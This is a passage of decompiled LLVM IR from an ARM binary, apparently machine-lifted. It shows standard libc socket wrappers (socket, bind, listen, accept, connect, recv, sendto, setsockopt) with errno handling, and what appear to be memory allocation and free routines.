dec_label_pc_fae4:                                ; preds = %dec_label_pc_f840, %dec_label_pc_f88c, %dec_label_pc_f870, %dec_label_pc_f864, %dec_label_pc_f850
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fae8

dec_label_pc_fae8:                                ; preds = %bb, %dec_label_pc_f824, %dec_label_pc_f81c, %dec_label_pc_f7c4, %dec_label_pc_f9bc, %dec_label_pc_f8d8, %dec_label_pc_fac8, %dec_label_pc_fabc, %dec_label_pc_fae4
  store i32 %v6_f798, i32* @r5, align 4
  store i32 %v9_f798, i32* @r6, align 4
  store i32 %v12_f798, i32* @r7, align 4
  store i32 %v15_f798, i32* @r8, align 4
  store i32 %v18_f798, i32* @sb, align 4
  store i32 %v21_f798, i32* @sl, align 4
  store i32 %v24_f798, i32* @fp, align 4
  %v29_faec = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_faec

; uselistorder directives
  uselistorder i32 %v2_fa90, { 1, 0 }
  uselistorder i32 %v1_f9b4, { 1, 2, 0 }
  uselistorder i32 %v1_f89c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_f898, { 1, 0, 2 }
  uselistorder i32 %v1_f88c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_f858.pre, { 0, 2, 1 }
  uselistorder i32 %v1_f834, { 1, 0 }
  uselistorder i32* %v1_f808, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_f7a8, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 21, 22, 23, 24, 25, 26, 27, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0 }
  uselistorder i32* %r2.global-to-local, { 8, 9, 10, 11, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 20, 14, 15, 16, 17, 18, 3, 4, 19, 5, 6, 7, 9, 8, 10, 21, 11, 13, 12, 0, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 10, 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_fae8, { 8, 6, 7, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_fae4, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_fabc, { 1, 0 }
  uselistorder label %dec_label_pc_f850, { 1, 0 }
}

define i32 @function_fb0c(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_fb0c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fb0c = load i32, i32* @r4, align 4
  store i32 %v3_fb0c, i32* %stack_var_-8, align 4
  %v5_fb10 = inttoptr i32 %arg3 to i32*
  %v6_fb10 = call i32 @accept(i32 %arg1, %sockaddr* %arg2, i32* %v5_fb10)
  store i32 %v6_fb10, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_fb10, -4095
  br i1 %tmp, label %dec_label_pc_fb30, label %dec_label_pc_fb20

dec_label_pc_fb20:                                ; preds = %dec_label_pc_fb0c
  %v0_fb20 = call i32 @function_cec4()
  %v0_fb24 = load i32, i32* %r4.global-to-local, align 4
  %v1_fb24 = sub i32 0, %v0_fb24
  %v2_fb28 = inttoptr i32 %v0_fb20 to i32*
  store i32 %v1_fb24, i32* %v2_fb28, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fb30

dec_label_pc_fb30:                                ; preds = %dec_label_pc_fb0c, %dec_label_pc_fb20
  %v0_fb30 = phi i32 [ %v6_fb10, %dec_label_pc_fb0c ], [ -1, %dec_label_pc_fb20 ]
  %v2_fb34 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fb34, i32* @r4, align 4
  ret i32 %v0_fb30

; uselistorder directives
  uselistorder i32 %v6_fb10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fb30, { 1, 0 }
}

define i32 @function_fb38(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_fb38:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fb38 = load i32, i32* @r4, align 4
  store i32 %v3_fb38, i32* %stack_var_-8, align 4
  %v5_fb3c = call i32 @bind(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_fb3c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_fb3c, -4095
  br i1 %tmp, label %dec_label_pc_fb5c, label %dec_label_pc_fb4c

dec_label_pc_fb4c:                                ; preds = %dec_label_pc_fb38
  %v0_fb4c = call i32 @function_cec4()
  %v0_fb50 = load i32, i32* %r4.global-to-local, align 4
  %v1_fb50 = sub i32 0, %v0_fb50
  %v2_fb54 = inttoptr i32 %v0_fb4c to i32*
  store i32 %v1_fb50, i32* %v2_fb54, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fb5c

dec_label_pc_fb5c:                                ; preds = %dec_label_pc_fb38, %dec_label_pc_fb4c
  %v0_fb5c = phi i32 [ %v5_fb3c, %dec_label_pc_fb38 ], [ -1, %dec_label_pc_fb4c ]
  %v2_fb60 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fb60, i32* @r4, align 4
  ret i32 %v0_fb5c

; uselistorder directives
  uselistorder i32 %v5_fb3c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fb5c, { 1, 0 }
}

define i32 @function_fb64(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_fb64:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fb64 = load i32, i32* @r4, align 4
  store i32 %v3_fb64, i32* %stack_var_-8, align 4
  %v5_fb68 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_fb68, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_fb68, -4095
  br i1 %tmp, label %dec_label_pc_fb88, label %dec_label_pc_fb78

dec_label_pc_fb78:                                ; preds = %dec_label_pc_fb64
  %v0_fb78 = call i32 @function_cec4()
  %v0_fb7c = load i32, i32* %r4.global-to-local, align 4
  %v1_fb7c = sub i32 0, %v0_fb7c
  %v2_fb80 = inttoptr i32 %v0_fb78 to i32*
  store i32 %v1_fb7c, i32* %v2_fb80, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fb88

dec_label_pc_fb88:                                ; preds = %dec_label_pc_fb64, %dec_label_pc_fb78
  %v0_fb88 = phi i32 [ %v5_fb68, %dec_label_pc_fb64 ], [ -1, %dec_label_pc_fb78 ]
  %v2_fb8c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fb8c, i32* @r4, align 4
  ret i32 %v0_fb88

; uselistorder directives
  uselistorder i32 %v5_fb68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fb88, { 1, 0 }
}

define i32 @function_fb90(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_fb90:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fb90 = load i32, i32* @r4, align 4
  store i32 %v3_fb90, i32* %stack_var_-8, align 4
  %v2_fb94 = call i32 @listen(i32 %arg1, i32 %arg2)
  store i32 %v2_fb94, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_fb94, -4095
  br i1 %tmp, label %dec_label_pc_fbb4, label %dec_label_pc_fba4

dec_label_pc_fba4:                                ; preds = %dec_label_pc_fb90
  %v0_fba4 = call i32 @function_cec4()
  %v0_fba8 = load i32, i32* %r4.global-to-local, align 4
  %v1_fba8 = sub i32 0, %v0_fba8
  %v2_fbac = inttoptr i32 %v0_fba4 to i32*
  store i32 %v1_fba8, i32* %v2_fbac, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fbb4

dec_label_pc_fbb4:                                ; preds = %dec_label_pc_fb90, %dec_label_pc_fba4
  %v0_fbb4 = phi i32 [ %v2_fb94, %dec_label_pc_fb90 ], [ -1, %dec_label_pc_fba4 ]
  %v2_fbb8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fbb8, i32* @r4, align 4
  ret i32 %v0_fbb4

; uselistorder directives
  uselistorder i32 %v2_fb94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fbb4, { 1, 0 }
}

define i32 @function_fbbc(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_fbbc:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fbbc = load i32, i32* @r4, align 4
  store i32 %v3_fbbc, i32* %stack_var_-8, align 4
  %v5_fbc0 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_fbc0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_fbc0, -4095
  br i1 %tmp, label %dec_label_pc_fbe0, label %dec_label_pc_fbd0

dec_label_pc_fbd0:                                ; preds = %dec_label_pc_fbbc
  %v0_fbd0 = call i32 @function_cec4()
  %v0_fbd4 = load i32, i32* %r4.global-to-local, align 4
  %v1_fbd4 = sub i32 0, %v0_fbd4
  %v2_fbd8 = inttoptr i32 %v0_fbd0 to i32*
  store i32 %v1_fbd4, i32* %v2_fbd8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fbe0

dec_label_pc_fbe0:                                ; preds = %dec_label_pc_fbbc, %dec_label_pc_fbd0
  %v0_fbe0 = phi i32 [ %v5_fbc0, %dec_label_pc_fbbc ], [ -1, %dec_label_pc_fbd0 ]
  %v2_fbe4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fbe4, i32* @r4, align 4
  ret i32 %v0_fbe0

; uselistorder directives
  uselistorder i32 %v5_fbc0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fbe0, { 1, 0 }
}

define i32 @function_fbe8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_fbe8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_fbe8 = load i32, i32* @r4, align 4
  store i32 %v3_fbe8, i32* %stack_var_-12, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_fbf4 = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_fbf4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_fbf4, -4095
  br i1 %tmp, label %dec_label_pc_fc14, label %dec_label_pc_fc04

dec_label_pc_fc04:                                ; preds = %dec_label_pc_fbe8
  %v0_fc04 = call i32 @function_cec4()
  %v0_fc08 = load i32, i32* %r4.global-to-local, align 4
  %v1_fc08 = sub i32 0, %v0_fc08
  %v2_fc0c = inttoptr i32 %v0_fc04 to i32*
  store i32 %v1_fc08, i32* %v2_fc0c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fc14

dec_label_pc_fc14:                                ; preds = %dec_label_pc_fbe8, %dec_label_pc_fc04
  %v0_fc14 = phi i32 [ %v5_fbf4, %dec_label_pc_fbe8 ], [ -1, %dec_label_pc_fc04 ]
  %v2_fc18 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_fc18, i32* @r4, align 4
  ret i32 %v0_fc14

; uselistorder directives
  uselistorder i32 %v5_fbf4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fc14, { 1, 0 }
}

define i32 @function_fc1c(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_fc1c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fc1c = load i32, i32* @r4, align 4
  store i32 %v3_fc1c, i32* %stack_var_-8, align 4
  store i32 %arg5, i32* %r4.global-to-local, align 4
  %v5_fc24 = call i32 @setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 0)
  store i32 %v5_fc24, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_fc24, -4095
  br i1 %tmp, label %dec_label_pc_fc44, label %dec_label_pc_fc34

dec_label_pc_fc34:                                ; preds = %dec_label_pc_fc1c
  %v0_fc34 = call i32 @function_cec4()
  %v0_fc38 = load i32, i32* %r4.global-to-local, align 4
  %v1_fc38 = sub i32 0, %v0_fc38
  %v2_fc3c = inttoptr i32 %v0_fc34 to i32*
  store i32 %v1_fc38, i32* %v2_fc3c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fc44

dec_label_pc_fc44:                                ; preds = %dec_label_pc_fc1c, %dec_label_pc_fc34
  %v0_fc44 = phi i32 [ %v5_fc24, %dec_label_pc_fc1c ], [ -1, %dec_label_pc_fc34 ]
  %v2_fc48 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fc48, i32* @r4, align 4
  ret i32 %v0_fc44

; uselistorder directives
  uselistorder i32 %v5_fc24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fc44, { 1, 0 }
}

define i32 @function_fc4c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_fc4c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fc4c = load i32, i32* @r4, align 4
  store i32 %v3_fc4c, i32* %stack_var_-8, align 4
  %v3_fc50 = call i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3)
  store i32 %v3_fc50, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_fc50, -4095
  br i1 %tmp, label %dec_label_pc_fc70, label %dec_label_pc_fc60

dec_label_pc_fc60:                                ; preds = %dec_label_pc_fc4c
  %v0_fc60 = call i32 @function_cec4()
  %v0_fc64 = load i32, i32* %r4.global-to-local, align 4
  %v1_fc64 = sub i32 0, %v0_fc64
  %v2_fc68 = inttoptr i32 %v0_fc60 to i32*
  store i32 %v1_fc64, i32* %v2_fc68, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fc70

dec_label_pc_fc70:                                ; preds = %dec_label_pc_fc4c, %dec_label_pc_fc60
  %v0_fc70 = phi i32 [ %v3_fc50, %dec_label_pc_fc4c ], [ -1, %dec_label_pc_fc60 ]
  %v2_fc74 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_fc74, i32* @r4, align 4
  ret i32 %v0_fc70

; uselistorder directives
  uselistorder i32 %v3_fc50, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fc70, { 1, 0 }
}

define i32 @function_fc78(i32 %arg1) local_unnamed_addr {
dec_label_pc_fc78:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_fc78 = load i32, i32* @r4, align 4
  %v6_fc78 = load i32, i32* @r5, align 4
  %v9_fc78 = load i32, i32* @r6, align 4
  %v0_fc7c = load i32, i32* %r0.global-to-local, align 4
  %v2_fc7c = icmp eq i32 %v0_fc7c, 0
  %v2_fc80 = ptrtoint i32* %stack_var_-20 to i32
  br i1 %v2_fc7c, label %bb, label %dec_label_pc_fc8c

bb:                                               ; preds = %dec_label_pc_fc78
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fc94

dec_label_pc_fc8c:                                ; preds = %dec_label_pc_fc78
  %tmp = icmp ugt i32 %v0_fc7c, -8
  br i1 %tmp, label %dec_label_pc_fd98, label %dec_label_pc_fc94

dec_label_pc_fc94:                                ; preds = %bb, %dec_label_pc_fc8c
  %v0_fc94 = phi i32 [ %v0_fc7c, %dec_label_pc_fc8c ], [ 1, %bb ]
  %v1_fc94 = add i32 %v0_fc94, 4
  store i32 %v1_fc94, i32* %stack_var_-20, align 4
  store i32 %v2_fc80, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1aa90.440 to i32), i32* %r0.global-to-local, align 4
  %v1_fcac = call i32 @function_10d4c()
  store i32 ptrtoint (i32** @global_var_18234.444 to i32), i32* %r0.global-to-local, align 4
  %v3_fcb8 = call i32 @function_ffd4(i32* bitcast (i32** @global_var_18234.444 to i32*), i32 %v2_fc80)
  store i32 %v3_fcb8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1aa90.440 to i32), i32* %r0.global-to-local, align 4
  store i32 64720, i32* @lr, align 4
  %v1_fccc = call i32 @function_10d4c()
  store i32 %v1_fccc, i32* %r0.global-to-local, align 4
  %v2_fcd0 = icmp eq i32 %v3_fcb8, 0
  br i1 %v2_fcd0, label %dec_label_pc_fcd8, label %dec_label_pc_fd88

dec_label_pc_fcd8:                                ; preds = %dec_label_pc_fc94
  %v2_fcdc = load i32, i32* @global_var_1aab8.274, align 4
  store i32 %v2_fcdc, i32* @r4, align 4
  %v2_fce0 = load i32, i32* %stack_var_-20, align 4
  %v3_fce4 = icmp ult i32 %v2_fce0, %v2_fcdc
  br i1 %v3_fce4, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_fcd8
  %v3_fce8 = add i32 %v2_fcdc, -1
  %v2_fcec = add i32 %v3_fce8, %v2_fce0
  %v2_fcf0 = sub i32 0, %v2_fcdc
  %v3_fcf4 = and i32 %v2_fcec, %v2_fcf0
  store i32 %v3_fcf4, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_fcd8, %bb14
  store i32 ptrtoint (i32* @global_var_1ad10.448 to i32), i32* %r0.global-to-local, align 4
  %v1_fd00 = call i32 @function_10d4c()
  %v0_fd04 = load i32, i32* @r4, align 4
  store i32 %v0_fd04, i32* %r0.global-to-local, align 4
  %v1_fd08 = call i32 @function_1143c(i32 %v0_fd04)
  store i32 %v1_fd08, i32* %r0.global-to-local, align 4
  %v7_fd0c = icmp eq i32 %v1_fd08, -1
  br i1 %v7_fd0c, label %bb15, label %dec_label_pc_fd18

bb15:                                             ; preds = %.thread3
  store i32 %v1_fd08, i32* @r5, align 4
  br label %dec_label_pc_fd2c

dec_label_pc_fd18:                                ; preds = %.thread3
  %v1_fd18 = add i32 %v1_fd08, 3
  %v1_fd1c = and i32 %v1_fd18, -4
  store i32 %v1_fd1c, i32* @r5, align 4
  %v9_fd20 = icmp eq i32 %v1_fd1c, %v1_fd08
  br i1 %v9_fd20, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_fd18
  %v3_fd24 = sub i32 %v1_fd1c, %v1_fd08
  store i32 %v3_fd24, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_fd18, %bb16
  %v1_fd28 = xor i1 %v9_fd20, true
  call void @__pseudo_cond_branch(i1 %v1_fd28, i32 ptrtoint (i32* @global_var_1143c.449 to i32))
  br label %dec_label_pc_fd2c

dec_label_pc_fd2c:                                ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_1ad10.448 to i32), i32* %r0.global-to-local, align 4
  store i32 64828, i32* @lr, align 4
  %v1_fd38 = call i32 @function_10d4c()
  store i32 %v1_fd38, i32* %r0.global-to-local, align 4
  %v0_fd3c = load i32, i32* @r5, align 4
  %v7_fd3c = icmp eq i32 %v0_fd3c, -1
  br i1 %v7_fd3c, label %dec_label_pc_fd98, label %dec_label_pc_fd44

dec_label_pc_fd44:                                ; preds = %dec_label_pc_fd2c
  store i32 ptrtoint (i32* @global_var_1aa90.440 to i32), i32* %r0.global-to-local, align 4
  %v1_fd50 = call i32 @function_10d4c()
  %v0_fd54 = load i32, i32* @r4, align 4
  %v0_fd58 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_18234.444 to i32), i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_fd58, 16777216
  %v2_fd60 = sdiv i32 %sext, 16777216
  %v5_fd60 = call i32 @function_10128(i32* bitcast (i32** @global_var_18234.444 to i32*), i32 %v2_fd60, i32 %v0_fd54)
  store i32 ptrtoint (i32** @global_var_18234.444 to i32), i32* %r0.global-to-local, align 4
  %v3_fd6c = call i32 @function_ffd4(i32* bitcast (i32** @global_var_18234.444 to i32*), i32 %v2_fc80)
  store i32 %v3_fd6c, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1aa90.440 to i32), i32* %r0.global-to-local, align 4
  store i32 64896, i32* @lr, align 4
  %v1_fd7c = call i32 @function_10d4c()
  store i32 %v1_fd7c, i32* %r0.global-to-local, align 4
  %v2_fd80 = icmp eq i32 %v3_fd6c, 0
  br i1 %v2_fd80, label %dec_label_pc_fd98, label %dec_label_pc_fd88

dec_label_pc_fd88:                                ; preds = %dec_label_pc_fc94, %dec_label_pc_fd44
  %v1_fd8c = phi i32 [ %v3_fcb8, %dec_label_pc_fc94 ], [ %v3_fd6c, %dec_label_pc_fd44 ]
  %v2_fd88 = load i32, i32* %stack_var_-20, align 4
  %v2_fd8c = inttoptr i32 %v1_fd8c to i32*
  store i32 %v2_fd88, i32* %v2_fd8c, align 4
  %v3_fd8c = load i32, i32* %r4.global-to-local, align 4
  %v4_fd8c = add i32 %v3_fd8c, 4
  store i32 %v4_fd8c, i32* %r4.global-to-local, align 4
  %v2_fd90 = icmp eq i32 %v4_fd8c, 0
  br i1 %v2_fd90, label %dec_label_pc_fd98, label %dec_label_pc_fda8

dec_label_pc_fd98:                                ; preds = %dec_label_pc_fd88, %dec_label_pc_fd44, %dec_label_pc_fd2c, %dec_label_pc_fc8c
  %v0_fd98 = call i32 @function_cec4()
  store i32 %v0_fd98, i32* %r0.global-to-local, align 4
  %v2_fda0 = inttoptr i32 %v0_fd98 to i32*
  store i32 12, i32* %v2_fda0, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fda8

dec_label_pc_fda8:                                ; preds = %dec_label_pc_fd88, %dec_label_pc_fd98
  %v0_fda8 = phi i32 [ %v4_fd8c, %dec_label_pc_fd88 ], [ 0, %dec_label_pc_fd98 ]
  store i32 %v0_fda8, i32* %r0.global-to-local, align 4
  store i32 %v3_fc78, i32* @r4, align 4
  store i32 %v6_fc78, i32* @r5, align 4
  store i32 %v9_fc78, i32* @r6, align 4
  ret i32 %v0_fda8

; uselistorder directives
  uselistorder i32 %v0_fda8, { 1, 0 }
  uselistorder i32 %v3_fd6c, { 1, 0, 2 }
  uselistorder i32 %v1_fd1c, { 1, 0, 2 }
  uselistorder i32 %v1_fd08, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 %v3_fcb8, { 1, 0, 2 }
  uselistorder i32 %v0_fc7c, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 6, 8, 4, 7, 9, 10, 11, 3, 13, 12, 5, 15, 14, 2, 16, 17, 18, 19, 0, 1 }
  uselistorder label %dec_label_pc_fda8, { 1, 0 }
  uselistorder label %dec_label_pc_fd88, { 1, 0 }
  uselistorder label %dec_label_pc_fd2c, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_fc94, { 1, 0 }
}

define i32 @function_fdcc() local_unnamed_addr {
dec_label_pc_fdcc:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_fdcc = load i32, i32* @r0, align 4
  %v2_fdcc = icmp eq i32 %v0_fdcc, 0
  %v3_fdd0 = load i32, i32* @r4, align 4
  store i32 %v3_fdd0, i32* %stack_var_-24, align 4
  %v6_fdd0 = load i32, i32* @r5, align 4
  %v9_fdd0 = load i32, i32* @r6, align 4
  %v15_fdd0 = load i32, i32* @r8, align 4
  br i1 %v2_fdcc, label %bb, label %bb11

bb:                                               ; preds = %dec_label_pc_fdcc
  ret i32 0

bb11:                                             ; preds = %dec_label_pc_fdcc
  %v1_fdd8 = add i32 %v0_fdcc, -4
  %v2_fdd8 = inttoptr i32 %v1_fdd8 to i32*
  %v3_fdd8 = load i32, i32* %v2_fdd8, align 4
  store i32 %v3_fdd8, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_18234.444 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_fdd8, i32* @r4, align 4
  %v1_fdf0 = call i32 @function_10d4c()
  %v0_fdf4 = load i32, i32* @r4, align 4
  %v0_fdf8 = load i32, i32* @r5, align 4
  %v4_fe00 = call i32 @function_10128(i32* bitcast (i32** @global_var_18234.444 to i32*), i32 %v0_fdf4, i32 %v0_fdf8)
  %v1_fe08 = inttoptr i32 %v4_fe00 to i32*
  %v2_fe08 = load i32, i32* %v1_fe08, align 4
  store i32 %v2_fe08, i32* %r6.global-to-local, align 4
  %v2_fe0c = load i32, i32* @global_var_1aab8.274, align 4
  %v4_fe10 = mul i32 %v2_fe0c, 8
  %v6_fe10 = icmp ult i32 %v2_fe08, %v4_fe10
  store i32 %v4_fe00, i32* @r4, align 4
  br i1 %v6_fe10, label %dec_label_pc_fe50, label %dec_label_pc_fe1c

dec_label_pc_fe1c:                                ; preds = %bb11
  %v1_fe24 = call i32 @function_10d4c()
  %v1_fe2c = call i32 @function_1143c(i32 0)
  %v0_fe30 = load i32, i32* @r4, align 4
  %v1_fe30 = add i32 %v0_fe30, 12
  store i32 %v1_fe30, i32* @r5, align 4
  %v9_fe34 = icmp eq i32 %v1_fe30, %v1_fe2c
  br i1 %v9_fe34, label %dec_label_pc_fe58, label %dec_label_pc_fe3c

dec_label_pc_fe3c:                                ; preds = %dec_label_pc_fe1c
  %v1_fe48 = call i32 @function_10d4c()
  br label %dec_label_pc_fe50

dec_label_pc_fe50:                                ; preds = %bb11, %dec_label_pc_fe3c, %bb14
  %v2_fe50 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_fe50, i32* @r4, align 4
  store i32 %v6_fdd0, i32* @r5, align 4
  store i32 %v9_fdd0, i32* %r6.global-to-local, align 4
  store i32 %v15_fdd0, i32* %r8.global-to-local, align 4
  %v0_fe54 = call i32 @function_10d4c()
  %v0_fe58.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_fe58

dec_label_pc_fe58:                                ; preds = %dec_label_pc_fe1c, %dec_label_pc_fe50
  %v1_fe60 = phi i32 [ %v0_fe30, %dec_label_pc_fe1c ], [ %v0_fe58.pre, %dec_label_pc_fe50 ]
  %v1_fe58 = add i32 %v1_fe60, 4
  %v2_fe58 = inttoptr i32 %v1_fe58 to i32*
  %v3_fe58 = load i32, i32* %v2_fe58, align 4
  %v2_fe5c = icmp eq i32 %v3_fe58, 0
  br i1 %v2_fe5c, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_fe58
  %v2_fe60 = add i32 %v1_fe60, 8
  %v3_fe60 = inttoptr i32 %v2_fe60 to i32*
  %v4_fe60 = load i32, i32* %v3_fe60, align 4
  %v3_fe64 = add i32 %v3_fe58, 8
  %v4_fe64 = inttoptr i32 %v3_fe64 to i32*
  store i32 %v4_fe60, i32* %v4_fe64, align 4
  %v0_fe68.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_fe58, %bb12
  %v0_fe68 = phi i32 [ %v1_fe60, %dec_label_pc_fe58 ], [ %v0_fe68.pre, %bb12 ]
  %v1_fe68 = add i32 %v0_fe68, 8
  %v2_fe68 = inttoptr i32 %v1_fe68 to i32*
  %v3_fe68 = load i32, i32* %v2_fe68, align 4
  %v1_fe6c = add i32 %v0_fe68, 4
  %v2_fe6c = inttoptr i32 %v1_fe6c to i32*
  %v3_fe6c = load i32, i32* %v2_fe6c, align 4
  %v2_fe70 = icmp eq i32 %v3_fe68, 0
  br i1 %v2_fe70, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_fe74 = add i32 %v3_fe68, 4
  %v4_fe74 = inttoptr i32 %v3_fe74 to i32*
  store i32 %v3_fe6c, i32* %v4_fe74, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_fe78 = load i32, i32* %r8.global-to-local, align 4
  %v3_fe78 = inttoptr i32 %v2_fe78 to i32*
  store i32 %v3_fe6c, i32* %v3_fe78, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_fe88 = call i32 @function_10d4c()
  %v0_fe8c = load i32, i32* %r6.global-to-local, align 4
  %v1_fe8c = load i32, i32* @r4, align 4
  %v0_fe94 = load i32, i32* @r5, align 4
  %v2_fe8c = sub i32 12, %v0_fe8c
  %v1_fe90 = add i32 %v2_fe8c, %v1_fe8c
  %v2_fe94 = sub i32 %v1_fe90, %v0_fe94
  %v1_fe98 = call i32 @function_1143c(i32 %v2_fe94)
  br label %dec_label_pc_fe50

; uselistorder directives
  uselistorder i32 %v0_fe68, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_1143c, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_fe58, { 1, 0 }
  uselistorder label %dec_label_pc_fe50, { 2, 1, 0 }
}

define i32 @function_febc(i32 %arg1, i32 %arg2) local_unnamed_addr {
